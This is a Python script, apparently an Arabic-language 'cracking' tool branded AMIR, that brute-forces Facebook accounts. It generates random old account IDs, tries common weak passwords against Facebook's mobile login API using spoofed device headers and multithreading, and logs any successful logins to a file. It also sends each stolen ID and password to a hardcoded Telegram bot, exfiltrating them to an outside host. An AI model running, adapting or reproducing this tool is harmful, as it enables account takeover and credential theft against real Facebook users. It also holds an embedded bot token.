import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime

# التثبيت التلقائي للمكتبات المفقودة
try:
    from cfonts import render, say
except ImportError:
    os.system('pip install python-cfonts')
    from cfonts import render, say

output = render('A M I R ', colors=['green', 'red'], align='center')
print(output)

id_member = []
id_publik = []

idk = ('7163990282')
tokenk = ('8781049161:AAEXqh4x6q3LBbelIj_INWNXKmsUwgeeYms')

# التأكد من وجود المكتبات المطلوبة
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# إلغاء تحذيرات SSL
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

# المتغيرات العامة
method = []
oks = []
cps = []
loop = 0
user = []

# الألوان
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    
    print("""\033[1;32m
  \033[1;91m\033[1;41m\033[1;97m @A_B_D113 »»» @SYRPY\033[;0m\033[1;91m\033[1;92m
\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══
[√] Name     : 𝐀𝐌𝐈𝐑.
[√] Tool     : OLD
[√] Version  : 03.0
\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══""")

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith(('1000000000', '100000000', '10000000', '1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('100006', '100007', '100008', '100009', '100001')):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''

def linex():
    print('\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══')

def old_Tow():
    global loop
    user = []
    ____banner____()
    limit = 1000  # تم تقليل العدد ليكون عملي ومناسب للتنفيذ المستمر
    prefixes = ['100003', '100004']
    for _ in range(limit):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
        
    with tred(max_workers=20) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        linex()
        for uid in user:
            pool.submit(login_1, uid)

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAMIR-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                AMIR_Url = f'https://www.facebook.com/profile.php?id={uid}'
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAMIR\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                tlgu = f'[•Facebook-{creationyear(uid)}]\nEMAIL : {uid}\nBASS : {pw}\n{AMIR_Url}\nTelegram :@A_B_D113'
                try:
                    requests.get(f"https://api.telegram.org/bot{tokenk}/sendMessage?chat_id={idk}&text={tlgu}")
                except Exception:
                    pass
                
                with open('AMIR-OLD-M1-OK.txt', 'a') as f:
                    f.write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        pass

if __name__ == '__main__':
    old_Tow()
